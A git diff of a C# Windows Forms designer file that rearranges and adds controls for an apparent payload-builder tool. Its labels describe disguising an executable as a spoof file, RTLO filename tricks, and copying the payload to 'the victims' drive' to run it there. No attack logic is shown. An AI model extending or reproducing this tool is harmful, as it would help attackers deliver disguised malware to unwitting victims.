@@ -34,6 +34,7 @@
             this.groupBox2 = new System.Windows.Forms.GroupBox();
             this.btnExtract = new System.Windows.Forms.LinkLabel();
             this.panel3 = new System.Windows.Forms.Panel();
+            this.btnClearImage = new System.Windows.Forms.LinkLabel();
             this.btnBrowseImage = new System.Windows.Forms.LinkLabel();
             this.groupBox6 = new System.Windows.Forms.GroupBox();
             this.radRTLO = new System.Windows.Forms.RadioButton();
@@ -50,7 +51,11 @@
             this.chkWaitPayloadFinish = new System.Windows.Forms.CheckBox();
             this.chkConsole = new System.Windows.Forms.CheckBox();
             this.chkVictimExec = new System.Windows.Forms.CheckBox();
+            this.imgFileIcon = new System.Windows.Forms.PictureBox();
             this.groupBox3 = new System.Windows.Forms.GroupBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.btnBuild = new System.Windows.Forms.Button();
+            this.btn_RefreshDrives = new System.Windows.Forms.Button();
             this.drpDrives = new System.Windows.Forms.ComboBox();
             this.label2 = new System.Windows.Forms.Label();
             this.groupBox1 = new System.Windows.Forms.GroupBox();
@@ -59,7 +64,10 @@
             this.tbPayload = new System.Windows.Forms.TextBox();
             this.label3 = new System.Windows.Forms.Label();
             this.tbSpoof = new System.Windows.Forms.TextBox();
+            this.btnBrowsePayload = new System.Windows.Forms.Button();
+            this.btnBrowseSpoof = new System.Windows.Forms.Button();
             this.panel2 = new System.Windows.Forms.Panel();
+            this.btnMiniPad = new System.Windows.Forms.Label();
             this.lblVersion = new System.Windows.Forms.Label();
             this.btn3rdParty = new System.Windows.Forms.Label();
             this.lblDbg = new System.Windows.Forms.Label();
@@ -74,22 +82,16 @@
             this.ofdSpoof = new System.Windows.Forms.OpenFileDialog();
             this.ofdIcon = new System.Windows.Forms.OpenFileDialog();
             this.tooltip = new System.Windows.Forms.ToolTip(this.components);
-            this.btnClearImage = new System.Windows.Forms.LinkLabel();
-            this.imgFileIcon = new System.Windows.Forms.PictureBox();
-            this.btnBuild = new System.Windows.Forms.Button();
-            this.btn_RefreshDrives = new System.Windows.Forms.Button();
-            this.btnBrowsePayload = new System.Windows.Forms.Button();
-            this.btnBrowseSpoof = new System.Windows.Forms.Button();
             this.formpanel.SuspendLayout();
             this.groupBox2.SuspendLayout();
             this.groupBox6.SuspendLayout();
             this.pnlFileOptGroup.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.imgFileIcon)).BeginInit();
             this.groupBox3.SuspendLayout();
             this.groupBox1.SuspendLayout();
             this.panel2.SuspendLayout();
             this.groupBox5.SuspendLayout();
             this.titlebar.SuspendLayout();
-            ((System.ComponentModel.ISupportInitialize)(this.imgFileIcon)).BeginInit();
             this.SuspendLayout();
             // 
             // formpanel
@@ -152,6 +154,24 @@
             this.panel3.Name = "panel3";
             this.panel3.Size = new System.Drawing.Size(1, 111);
             this.panel3.TabIndex = 27;
+            // 
+            // btnClearImage
+            // 
+            this.btnClearImage.ActiveLinkColor = System.Drawing.Color.White;
+            this.btnClearImage.AutoSize = true;
+            this.btnClearImage.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnClearImage.Image = global::masamangalternatibo.Properties.Resources.delete16;
+            this.btnClearImage.LinkBehavior = System.Windows.Forms.LinkBehavior.NeverUnderline;
+            this.btnClearImage.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(187)))), ((int)(((byte)(255)))));
+            this.btnClearImage.Location = new System.Drawing.Point(235, 96);
+            this.btnClearImage.Name = "btnClearImage";
+            this.btnClearImage.Size = new System.Drawing.Size(19, 15);
+            this.btnClearImage.TabIndex = 26;
+            this.btnClearImage.TabStop = true;
+            this.btnClearImage.Text = "    ";
+            this.tooltip.SetToolTip(this.btnClearImage, "Use the default icon");
+            this.btnClearImage.VisitedLinkColor = System.Drawing.Color.White;
+            this.btnClearImage.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.btnClearImage_LinkClicked);
             // 
             // btnBrowseImage
             // 
@@ -312,7 +332,7 @@
             this.chkStreamConsole.TabIndex = 8;
             this.chkStreamConsole.Text = "Stream console output to text file";
             this.tooltip.SetToolTip(this.chkStreamConsole, "An alternative dumping/logging option;Stream the console\r\noutput (stdout) to a te" +
-        "xt file\r\n\r\nExecutes as: cmd [opt] [payload] > %random%.txt");
+        "xt file\r\n\r\nExecutes as: cmd [opt] [payload] > %random%.madmp");
             this.chkStreamConsole.UseVisualStyleBackColor = true;
             // 
             // chkWaitPayloadFinish
@@ -350,8 +370,20 @@
             this.tooltip.SetToolTip(this.chkVictimExec, "Copies the payload and spoofed file to the victims\' drive\r\nand executes it there");
             this.chkVictimExec.UseVisualStyleBackColor = true;
             // 
+            // imgFileIcon
+            // 
+            this.imgFileIcon.BackColor = System.Drawing.Color.Transparent;
+            this.imgFileIcon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.imgFileIcon.Location = new System.Drawing.Point(235, 34);
+            this.imgFileIcon.Name = "imgFileIcon";
+            this.imgFileIcon.Size = new System.Drawing.Size(60, 60);
+            this.imgFileIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.imgFileIcon.TabIndex = 10;
+            this.imgFileIcon.TabStop = false;
+            // 
             // groupBox3
             // 
+            this.groupBox3.Controls.Add(this.button1);
             this.groupBox3.Controls.Add(this.btnBuild);
             this.groupBox3.Controls.Add(this.btn_RefreshDrives);
             this.groupBox3.Controls.Add(this.drpDrives);
@@ -361,6 +393,53 @@
             this.groupBox3.Size = new System.Drawing.Size(310, 40);
             this.groupBox3.TabIndex = 16;
             this.groupBox3.TabStop = false;
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.Transparent;
+            this.button1.FlatAppearance.BorderSize = 0;
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Image = global::masamangalternatibo.Properties.Resources.pencil16;
+            this.button1.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            this.button1.Location = new System.Drawing.Point(181, 12);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(61, 22);
+            this.button1.TabIndex = 17;
+            this.button1.Text = "Write";
+            this.button1.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
+            this.tooltip.SetToolTip(this.button1, "Generate the script and opens the editor for manual editing of the script before " +
+        "compilation.\r\n(Script will appear in MiniPad)");
+            this.button1.UseVisualStyleBackColor = false;
+            // 
+            // btnBuild
+            // 
+            this.btnBuild.BackColor = System.Drawing.Color.Transparent;
+            this.btnBuild.FlatAppearance.BorderSize = 0;
+            this.btnBuild.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.btnBuild.Image = global::masamangalternatibo.Properties.Resources.build16;
+            this.btnBuild.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            this.btnBuild.Location = new System.Drawing.Point(243, 12);
+            this.btnBuild.Name = "btnBuild";
+            this.btnBuild.Size = new System.Drawing.Size(61, 22);
+            this.btnBuild.TabIndex = 14;
+            this.btnBuild.Text = "Build";
+            this.btnBuild.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
+            this.tooltip.SetToolTip(this.btnBuild, "Build the payload");
+            this.btnBuild.UseVisualStyleBackColor = false;
+            // 
+            // btn_RefreshDrives
+            // 
+            this.btn_RefreshDrives.BackColor = System.Drawing.Color.Transparent;
+            this.btn_RefreshDrives.FlatAppearance.BorderSize = 0;
+            this.btn_RefreshDrives.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.btn_RefreshDrives.Image = global::masamangalternatibo.Properties.Resources.sync16;
+            this.btn_RefreshDrives.Location = new System.Drawing.Point(151, 11);
+            this.btn_RefreshDrives.Name = "btn_RefreshDrives";
+            this.btn_RefreshDrives.Size = new System.Drawing.Size(26, 22);
+            this.btn_RefreshDrives.TabIndex = 16;
+            this.tooltip.SetToolTip(this.btn_RefreshDrives, "Rescan for drives");
+            this.btn_RefreshDrives.UseVisualStyleBackColor = false;
+            this.btn_RefreshDrives.Click += new System.EventHandler(this.btnRefreshDrives_Click);
             // 
             // drpDrives
             // 
@@ -447,11 +526,41 @@
             this.tbSpoof.Size = new System.Drawing.Size(186, 22);
             this.tbSpoof.TabIndex = 3;
             // 
+            // btnBrowsePayload
+            // 
+            this.btnBrowsePayload.BackColor = System.Drawing.Color.Transparent;
+            this.btnBrowsePayload.FlatAppearance.BorderSize = 0;
+            this.btnBrowsePayload.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.btnBrowsePayload.Image = global::masamangalternatibo.Properties.Resources.folder16;
+            this.btnBrowsePayload.Location = new System.Drawing.Point(269, 14);
+            this.btnBrowsePayload.Name = "btnBrowsePayload";
+            this.btnBrowsePayload.Size = new System.Drawing.Size(25, 22);
+            this.btnBrowsePayload.TabIndex = 4;
+            this.tooltip.SetToolTip(this.btnBrowsePayload, "Browse a payload executable to use");
+            this.btnBrowsePayload.UseVisualStyleBackColor = false;
+            this.btnBrowsePayload.Click += new System.EventHandler(this.btnBrowsePayload_Click);
+            // 
+            // btnBrowseSpoof
+            // 
+            this.btnBrowseSpoof.BackColor = System.Drawing.Color.Transparent;
+            this.btnBrowseSpoof.FlatAppearance.BorderSize = 0;
+            this.btnBrowseSpoof.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.btnBrowseSpoof.Image = global::masamangalternatibo.Properties.Resources.folder16;
+            this.btnBrowseSpoof.Location = new System.Drawing.Point(269, 42);
+            this.btnBrowseSpoof.Name = "btnBrowseSpoof";
+            this.btnBrowseSpoof.Size = new System.Drawing.Size(25, 22);
+            this.btnBrowseSpoof.TabIndex = 5;
+            this.tooltip.SetToolTip(this.btnBrowseSpoof, "Browse a file for the payload to spoof as\r\nNote: Spoof file will be executed rega" +
+        "rdless of format");
+            this.btnBrowseSpoof.UseVisualStyleBackColor = false;
+            this.btnBrowseSpoof.Click += new System.EventHandler(this.btnBrowseSpoof_Click);
+            // 
             // panel2
             // 
             this.panel2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
             | System.Windows.Forms.AnchorStyles.Right)));
             this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(185)))), ((int)(((byte)(29)))), ((int)(((byte)(71)))));
+            this.panel2.Controls.Add(this.btnMiniPad);
             this.panel2.Controls.Add(this.lblVersion);
             this.panel2.Controls.Add(this.btn3rdParty);
             this.panel2.Controls.Add(this.lblDbg);
@@ -460,11 +569,23 @@
             this.panel2.Size = new System.Drawing.Size(552, 18);
             this.panel2.TabIndex = 6;
             // 
+            // btnMiniPad
+            // 
+            this.btnMiniPad.AutoSize = true;
+            this.btnMiniPad.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.btnMiniPad.Location = new System.Drawing.Point(412, 2);
+            this.btnMiniPad.Name = "btnMiniPad";
+            this.btnMiniPad.Size = new System.Drawing.Size(49, 13);
+            this.btnMiniPad.TabIndex = 22;
+            this.btnMiniPad.Text = "MiniPad";
+            this.tooltip.SetToolTip(this.btnMiniPad, "Open the about form");
+            this.btnMiniPad.Click += new System.EventHandler(this.btnMiniPad_Click);
+            // 
             // lblVersion
             // 
             this.lblVersion.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
             this.lblVersion.AutoSize = true;
-            this.lblVersion.Location = new System.Drawing.Point(521, 2);
+            this.lblVersion.Location = new System.Drawing.Point(507, 2);
             this.lblVersion.Name = "lblVersion";
             this.lblVersion.Size = new System.Drawing.Size(69, 13);
             this.lblVersion.TabIndex = 1;
@@ -475,7 +596,7 @@
             // 
             this.btn3rdParty.AutoSize = true;
             this.btn3rdParty.Cursor = System.Windows.Forms.Cursors.Hand;
-            this.btn3rdParty.Location = new System.Drawing.Point(481, 2);
+            this.btn3rdParty.Location = new System.Drawing.Point(467, 2);
             this.btn3rdParty.Name = "btn3rdParty";
             this.btn3rdParty.Size = new System.Drawing.Size(39, 13);
             this.btn3rdParty.TabIndex = 21;
@@ -595,94 +716,6 @@
             this.tooltip.InitialDelay = 150;
             this.tooltip.ReshowDelay = 100;
             // 
-            // btnClearImage
-            // 
-            this.btnClearImage.ActiveLinkColor = System.Drawing.Color.White;
-            this.btnClearImage.AutoSize = true;
-            this.btnClearImage.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.btnClearImage.Image = global::masamangalternatibo.Properties.Resources.delete16;
-            this.btnClearImage.LinkBehavior = System.Windows.Forms.LinkBehavior.NeverUnderline;
-            this.btnClearImage.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(187)))), ((int)(((byte)(255)))));
-            this.btnClearImage.Location = new System.Drawing.Point(235, 96);
-            this.btnClearImage.Name = "btnClearImage";
-            this.btnClearImage.Size = new System.Drawing.Size(19, 15);
-            this.btnClearImage.TabIndex = 26;
-            this.btnClearImage.TabStop = true;
-            this.btnClearImage.Text = "    ";
-            this.tooltip.SetToolTip(this.btnClearImage, "Use the default icon");
-            this.btnClearImage.VisitedLinkColor = System.Drawing.Color.White;
-            this.btnClearImage.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.btnClearImage_LinkClicked);
-            // 
-            // imgFileIcon
-            // 
-            this.imgFileIcon.BackColor = System.Drawing.Color.Transparent;
-            this.imgFileIcon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
-            this.imgFileIcon.Location = new System.Drawing.Point(235, 34);
-            this.imgFileIcon.Name = "imgFileIcon";
-            this.imgFileIcon.Size = new System.Drawing.Size(60, 60);
-            this.imgFileIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
-            this.imgFileIcon.TabIndex = 10;
-            this.imgFileIcon.TabStop = false;
-            // 
-            // btnBuild
-            // 
-            this.btnBuild.BackColor = System.Drawing.Color.Transparent;
-            this.btnBuild.FlatAppearance.BorderSize = 0;
-            this.btnBuild.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
-            this.btnBuild.Image = global::masamangalternatibo.Properties.Resources.build16;
-            this.btnBuild.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
-            this.btnBuild.Location = new System.Drawing.Point(243, 12);
-            this.btnBuild.Name = "btnBuild";
-            this.btnBuild.Size = new System.Drawing.Size(61, 22);
-            this.btnBuild.TabIndex = 14;
-            this.btnBuild.Text = "Build";
-            this.btnBuild.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
-            this.tooltip.SetToolTip(this.btnBuild, "Build the payload");
-            this.btnBuild.UseVisualStyleBackColor = false;
-            // 
-            // btn_RefreshDrives
-            // 
-            this.btn_RefreshDrives.BackColor = System.Drawing.Color.Transparent;
-            this.btn_RefreshDrives.FlatAppearance.BorderSize = 0;
-            this.btn_RefreshDrives.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
-            this.btn_RefreshDrives.Image = global::masamangalternatibo.Properties.Resources.sync16;
-            this.btn_RefreshDrives.Location = new System.Drawing.Point(151, 11);
-            this.btn_RefreshDrives.Name = "btn_RefreshDrives";
-            this.btn_RefreshDrives.Size = new System.Drawing.Size(26, 22);
-            this.btn_RefreshDrives.TabIndex = 16;
-            this.tooltip.SetToolTip(this.btn_RefreshDrives, "Rescan for drives");
-            this.btn_RefreshDrives.UseVisualStyleBackColor = false;
-            this.btn_RefreshDrives.Click += new System.EventHandler(this.btnRefreshDrives_Click);
-            // 
-            // btnBrowsePayload
-            // 
-            this.btnBrowsePayload.BackColor = System.Drawing.Color.Transparent;
-            this.btnBrowsePayload.FlatAppearance.BorderSize = 0;
-            this.btnBrowsePayload.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
-            this.btnBrowsePayload.Image = global::masamangalternatibo.Properties.Resources.folder16;
-            this.btnBrowsePayload.Location = new System.Drawing.Point(269, 14);
-            this.btnBrowsePayload.Name = "btnBrowsePayload";
-            this.btnBrowsePayload.Size = new System.Drawing.Size(25, 22);
-            this.btnBrowsePayload.TabIndex = 4;
-            this.tooltip.SetToolTip(this.btnBrowsePayload, "Browse a payload executable to use");
-            this.btnBrowsePayload.UseVisualStyleBackColor = false;
-            this.btnBrowsePayload.Click += new System.EventHandler(this.btnBrowsePayload_Click);
-            // 
-            // btnBrowseSpoof
-            // 
-            this.btnBrowseSpoof.BackColor = System.Drawing.Color.Transparent;
-            this.btnBrowseSpoof.FlatAppearance.BorderSize = 0;
-            this.btnBrowseSpoof.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
-            this.btnBrowseSpoof.Image = global::masamangalternatibo.Properties.Resources.folder16;
-            this.btnBrowseSpoof.Location = new System.Drawing.Point(269, 42);
-            this.btnBrowseSpoof.Name = "btnBrowseSpoof";
-            this.btnBrowseSpoof.Size = new System.Drawing.Size(25, 22);
-            this.btnBrowseSpoof.TabIndex = 5;
-            this.tooltip.SetToolTip(this.btnBrowseSpoof, "Browse a file for the payload to spoof as\r\nNote: Spoof file will be executed rega" +
-        "rdless of format");
-            this.btnBrowseSpoof.UseVisualStyleBackColor = false;
-            this.btnBrowseSpoof.Click += new System.EventHandler(this.btnBrowseSpoof_Click);
-            // 
             // Form1
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
@@ -706,6 +739,7 @@
             this.groupBox6.PerformLayout();
             this.pnlFileOptGroup.ResumeLayout(false);
             this.pnlFileOptGroup.PerformLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.imgFileIcon)).EndInit();
             this.groupBox3.ResumeLayout(false);
             this.groupBox3.PerformLayout();
             this.groupBox1.ResumeLayout(false);
@@ -716,7 +750,6 @@
             this.groupBox5.PerformLayout();
             this.titlebar.ResumeLayout(false);
             this.titlebar.PerformLayout();
-            ((System.ComponentModel.ISupportInitialize)(this.imgFileIcon)).EndInit();
             this.ResumeLayout(false);
 
         }
@@ -773,6 +806,8 @@
         private System.Windows.Forms.Panel panel3;
         private System.Windows.Forms.ToolTip tooltip;
         private System.Windows.Forms.LinkLabel btnExtract;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label btnMiniPad;
     }
 }
 
